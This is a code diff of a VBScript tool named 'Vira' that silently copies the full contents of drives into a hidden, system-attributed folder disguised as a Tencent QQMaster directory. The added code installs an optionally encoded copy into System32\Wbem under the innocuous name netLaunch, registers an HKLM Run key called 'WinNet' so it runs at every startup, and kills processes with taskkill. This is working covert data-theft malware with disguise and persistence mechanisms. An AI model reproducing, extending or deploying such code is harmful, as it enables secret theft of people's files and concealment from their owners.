@@ -1,12 +1,12 @@
-'Version 2.14 Ultimate
+'Version 2.15 Ultimate
 Option Explicit
 On Error Resume Next
-Const ViraVersion = "2.14"
+Const ViraVersion = "2.15"
 
 Dim FlagFileNum, FlagFile, MaxCapacityGB, Destination
 Dim Container, IsCopied(23)
-Dim WScript, Fso, Fin, Fout
-Set WScript = CreateObject("WScript.Shell")
+Dim Shell, Fso, Fin, Fout
+Set Shell = CreateObject("WScript.Shell")
 Set Fso = CreateObject("Scripting.FileSystemObject")
 
 '********************
@@ -23,11 +23,47 @@ Destination = "D:\Program Files\Tencent\QQMaster\" 'Must end with a backslash [\
 ' End of Customize Section
 '***************************
 
-ViraInitialize
-Do
-  ViraMain
-  Wsh.Sleep 1000
-Loop
+If Wsh.Arguments.Count = 0 Then
+  ProcessMain
+Else
+  Dim i, str
+  For i = 0 To Wsh.Arguments.Count - 1
+    str = LCase(Wsh.Arguments(i))
+    If Chr(Asc(str)) = "/" Or Chr(Asc(str)) = "-" Then
+      str = Mid(str, 2, Len(str)-1)
+      Select Case str
+        Case Else
+          MsgBox "Unknown switch """ & Wsh.Arguments(i) & """", 16, "Vira " & ViraVersion & " Error"
+          Wsh.Quit -1
+      End Select
+    Else
+      Select Case str
+        Case "help"
+          MsgBox "XWH loves YZ.", 0, "Help"
+          Wsh.Quit 0
+        Case "execute"
+          ProcessMain
+        Case "install"
+          InstallLocal
+        Case "uninst"
+          UninstLocal
+        Case "uninstall"
+          UninstLocal
+        Case Else
+          MsgBox "Unknown parameter """ & str & """", 16, "Vira " & ViraVersion & " Error"
+          Wsh.Quit -1
+      End Select
+    End If
+  Next
+End If
+
+Public Sub ProcessMain
+  ViraInitialize
+  Do
+    ViraMain
+    Wsh.Sleep 1000
+  Loop
+End Sub
 
 '*************************
 ' Vira Process Functions
@@ -35,6 +71,7 @@ Loop
 
 Public Sub ViraInitialize()
   Dim i
+  Shell.Run "CMD.EXE /C MKDIR """ & Destination & """", 0, True
   Set Container = Fso.GetFolder(Destination)
   Container.Attributes = 7
   For i = 0 To 22
@@ -106,9 +143,66 @@ Public Sub CopyDrive(DriveLetter)
   Fso.CopyFolder DriveLetter & ":\*", Target, True
 End Sub
 
-'Uncompleted
-Public Sub HarvestDrive(DriveLetter)
-  Dim UDrive
-  Set UDrive = Fso.GetDrive(DriveLetter)
+'***********************
+Public Sub InstallLocal()
+  If Not AdminTest() Then
+    MsgBox "Installation requires Administrator rights!", 16, "Vira " & ViraVersion & " Error"
+    Wsh.Quit 1
+  End If
+  Dim TempString
+  TempString = Fso.GetParentFolderName(Wsh.ScriptFullName) & "\vtemp.vbe"
+  EndProcess "netLaunch.exe"
+  If Fso.FileExists("screnc.exe") Then
+    Shell.Run "screnc.exe /s """ & Wsh.ScriptFullName & """ """ & TempString & """"
+    Fso.CopyFile TempString, "C:\Windows\system32\Wbem\netLaunch.vbe", True
+    Fso.DeleteFile TempString, True
+  Else
+    Fso.CopyFile Wsh.ScriptFullName, "C:\Windows\system32\Wbem\netLaunch.vbe", True
+  End If
+  Fso.CopyFile Wsh.FullName, "C:\Windows\system32\Wbem\netLaunch.exe", True
+  
+  TempString = "C:\Windows\system32\Wbem\netLaunch.exe C:\Windows\system32\Wbem\netLaunch.vbe"
+  Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinNet", _
+          TempString, "REG_SZ"
+  Shell.Run TempString, 0, False
+  MsgBox "Installation Complete!", 64, "Vira " & ViraVersion
+  Wsh.Quit 0
+End Sub
+
+Public Sub UninstLocal()
+  If Not AdminTest() Then
+    MsgBox "Uninstallation requires Administrator rights!", 16, "Vira " & ViraVersion & " Error"
+    Wsh.Quit 1
+  End If
+  EndProcess "netLaunch.exe"
+  Fso.DeleteFile "C:\Windows\system32\Wbem\netLaunch.exe", True
+  Fso.DeleteFile "C:\Windows\system32\Wbem\netLaunch.vbe", True
+  Shell.RegDelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinNet"
+  MsgBox "Uninstallation Complete!", 64, "Vira " & ViraVersion
+  Wsh.Quit 0
+End Sub
+
+Public Function AdminTest()
+  On Error Resume Next
+  Dim TestDir
+  TestDir = "C:\Windows\AdminTest\"
+  Fso.CreateFolder TestDir
+  Wsh.Sleep 1000
+  AdminTest = Fso.FolderExists(TestDir)
+  If AdminTest Then
+    Fso.DeleteFolder TestDir
+  End If
+End Function
+
+Public Sub EndProcess(ProcessName)
+  On Error Resume Next
+  Shell.Run "TASKKILL.EXE /F /FI ""IMAGENAME eq " & ProcessName & """", 0, True
+  Exit Sub
+  Dim Wmi, Procs, Proc
+  Set Wmi = GetObject("winmgmts:\\.\root\cimv2")
+  Set Procs = Wmi.ExecQuery("select * from win32_process where name='" & ProcessName & "'")
+  For Each Proc In Procs 
+    Proc.Terminate 
+  Next
 End Sub
 
